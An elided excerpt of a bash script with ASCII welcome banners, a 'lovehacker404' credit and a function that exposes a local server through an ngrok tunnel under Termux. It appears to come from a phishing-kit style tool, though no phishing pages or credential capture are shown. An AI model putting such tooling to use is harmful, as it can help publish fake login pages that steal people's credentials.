...
| $$  \ $$| $$      /$$__  $$| $$  | $$| $$  | $$| $$_____/| $$  | $$      
| $$$$$$$/| $$     |  $$$$$$$| $$  | $$|  $$$$$$$|  $$$$$$$|  $$$$$$$      
|_______/ |__/      \_______/|__/  |__/ \_______/ \_______/ \_______/      
${ORANGE} ------ WELCOME TO MY WORLD ✌️-------●	                
	EOF
}
## Small Banner
banner_small() {
...
${ORANGE} 
${ORANGE} ████████████████████████████████████████████████ 
${ORANGE} █ ${RED}___  _  _ _ ____ _  _ _ _  _ ____ ${MAGENTA}branded  ${ORANGE}█
...
start_ngrok() {
    ...
    if [[ `command -v termux-chroot` ]]; then
        sleep 2 && termux-chroot ./.server/ngrok http "$HOST":"$PORT" > /dev/null 2>&1 & # Thanks to branded  (https://github.com/lovehacker404)
    else
